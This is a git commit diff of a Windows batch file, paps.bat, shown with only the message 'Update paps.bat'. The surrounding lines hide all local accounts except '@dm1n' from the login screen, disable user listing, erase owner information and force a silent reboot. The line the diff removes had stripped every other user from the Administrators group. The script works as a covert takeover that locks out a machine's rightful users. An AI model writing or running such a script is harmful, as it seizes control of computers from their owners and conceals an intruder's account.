e7aa9168b5e06b945f26298932acefd4d6d265e4
shansnow89 <norshanlee89@gmail.com>
2026-06-21 17:22:52 +0800

    Update paps.bat

--- paps.bat
+++ paps.bat
@@ -15,6 +15,5 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccou
 for /f "skip=4 tokens=1" %%u in ('net user 2^>nul') do @if /i not "%%u"=="@dm1n" reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "%%u" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnumerateLocalUsers /t REG_DWORD /d 0 /f >nul 2>&1
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOwner /f >nul 2>&1 & reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOrganization /f >nul 2>&1
-for /f "skip=4 tokens=1-3 delims= " %a in ('net localgroup Administrators') do @if /i not "%a"=="@dm1n" net localgroup Administrators %a /delete >nul 2>&1
 tzutil /s "Singapore Standard Time" >nul 2>&1
 shutdown -r -t 0 >nul 2>&1
